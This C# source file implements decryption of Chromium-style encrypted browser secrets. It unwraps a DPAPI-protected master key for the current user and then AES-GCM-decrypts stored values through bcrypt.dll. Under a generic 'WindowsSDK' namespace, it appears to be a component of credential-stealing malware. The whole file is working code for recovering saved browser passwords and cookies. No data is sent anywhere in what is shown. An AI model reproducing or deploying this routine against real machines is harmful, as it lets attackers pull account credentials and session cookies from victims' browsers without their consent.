using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using WindowsSDK.Objects.Enums;

namespace WindowsSDK.Data.Crypto
{
    public class CryptoProvider
    {
        [DllImport("bcrypt.dll")]
        public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint flags);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptGetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags);

        [DllImport("bcrypt.dll", EntryPoint = "BCryptSetProperty")]
        internal static extern uint BCryptSetAlgorithmProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptImportKey(IntPtr hAlgorithm, IntPtr hImportKey, [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbInput, int cbInput, uint dwFlags);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptDestroyKey(IntPtr hKey);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, ref int pcbResult, int dwFlags);

        public static string Decrypt(byte[] bMasterKey, string chiperText)
        {
            Encoding encoding = Encoding.GetEncoding("windows-1251");
            byte[] array = new byte[bMasterKey.Length - 5];
            Array.Copy(bMasterKey, 5, array, 0, bMasterKey.Length - 5);
            return encoding.GetString(Decrypt(bMasterKey: CryptoHelper.DecryptBlob(array, DataProtectionScope.CurrentUser), bEncryptedData: encoding.GetBytes(chiperText)));
        }

        private static byte[] Decrypt(byte[] bEncryptedData, byte[] bMasterKey)
        {
            byte[] array = new byte[12]
            {
                1, 2, 3, 4, 5, 6, 7, 8, 0, 0,
                0, 0
            };
            Array.Copy(bEncryptedData, 3, array, 0, 12);
            try
            {
                byte[] array2 = new byte[bEncryptedData.Length - 15];
                Array.Copy(bEncryptedData, 15, array2, 0, bEncryptedData.Length - 15);
                byte[] array3 = new byte[16];
                byte[] array4 = new byte[array2.Length - array3.Length];
                Array.Copy(array2, array2.Length - 16, array3, 0, 16);
                Array.Copy(array2, 0, array4, 0, array2.Length - array3.Length);
                return new CryptoProvider().Get(bMasterKey, array, null, array4, array3);
            }
            catch
            {
            }
            return null;
        }

        private byte[] Get(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
        {
            IntPtr intPtr = OpenAlgorithmProvider("AES", "Microsoft Primitive Provider", "ChainingModeGCM");
            IntPtr hglobal = ImportKey(intPtr, key, out IntPtr hKey);
            BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, aad, authTag);

            byte[] array2;

            try
            {
                byte[] array = new byte[MaxAuthTagSize(intPtr)];
                int pcbResult = 0;

                if (BCryptDecrypt(hKey, cipherText, cipherText.Length, ref pPaddingInfo, array, array.Length, null, 0, ref pcbResult, 0) != 0)
                {
                    throw new CryptographicException();
                }

                array2 = new byte[pcbResult];

                if (BCryptDecrypt(hKey, cipherText, cipherText.Length, ref pPaddingInfo, array, array.Length, array2, array2.Length, ref pcbResult, 0) != 0)
                {
                    throw new CryptographicException();
                }
            }
            finally
            {
                BCryptDestroyKey(hKey);
                Marshal.FreeHGlobal(hglobal);
                BCryptCloseAlgorithmProvider(intPtr, 0u);
            }

            return array2;
        }

        private int MaxAuthTagSize(IntPtr hAlg)
        {
            byte[] property = GetProperty(hAlg, "AuthTagLength");
            return BitConverter.ToInt32(new byte[4]
            {
                property[4],
                property[5],
                property[6],
                property[7]
            }, 0);
        }

        private IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
        {
            IntPtr phAlgorithm = IntPtr.Zero;
            uint num = BCryptOpenAlgorithmProvider(out phAlgorithm, alg, provider, 0u);
            if (num != 0)
            {
                throw new CryptographicException($"BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{num}");
            }
            byte[] bytes = Encoding.Unicode.GetBytes(chainingMode);
            num = BCryptSetAlgorithmProperty(phAlgorithm, "ChainingMode", bytes, bytes.Length, 0);
            if (num != 0)
            {
                throw new CryptographicException($"BCrypt.BCryptSetAlgorithmProperty(ChainingMode, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{num}");
            }
            return phAlgorithm;
        }

        private IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
        {
            int num = BitConverter.ToInt32(GetProperty(hAlg, "ObjectLength"), 0);
            IntPtr intPtr = Marshal.AllocHGlobal(num);
            byte[] array = Concat(BitConverter.GetBytes(1296188491), BitConverter.GetBytes(1), BitConverter.GetBytes(key.Length), key);
            uint num2 = BCryptImportKey(hAlg, IntPtr.Zero, "KeyDataBlob", out hKey, intPtr, num, array, array.Length, 0u);
            if (num2 != 0)
            {
                throw new CryptographicException($"BCrypt.BCryptImportKey() failed with status code:{num2}");
            }
            return intPtr;
        }

        private byte[] GetProperty(IntPtr hAlg, string name)
        {
            int pcbResult = 0;
            uint num = BCryptGetProperty(hAlg, name, null, 0, ref pcbResult, 0u);
            if (num != 0)
            {
                throw new CryptographicException($"BCrypt.BCryptGetProperty() (get size) failed with status code:{num}");
            }
            byte[] array = new byte[pcbResult];
            num = BCryptGetProperty(hAlg, name, array, array.Length, ref pcbResult, 0u);
            if (num != 0)
            {
                throw new CryptographicException($"BCrypt.BCryptGetProperty() failed with status code:{num}");
            }
            return array;
        }

        public byte[] Concat(params byte[][] arrays)
        {
            int num = 0;
            byte[][] array = arrays;
            foreach (byte[] array2 in array)
            {
                if (array2 != null)
                {
                    num += array2.Length;
                }
            }
            byte[] array3 = new byte[num - 1 + 1];
            int num2 = 0;
            array = arrays;
            foreach (byte[] array4 in array)
            {
                if (array4 != null)
                {
                    Buffer.BlockCopy(array4, 0, array3, num2, array4.Length);
                    num2 += array4.Length;
                }
            }
            return array3;
        }
    }
}
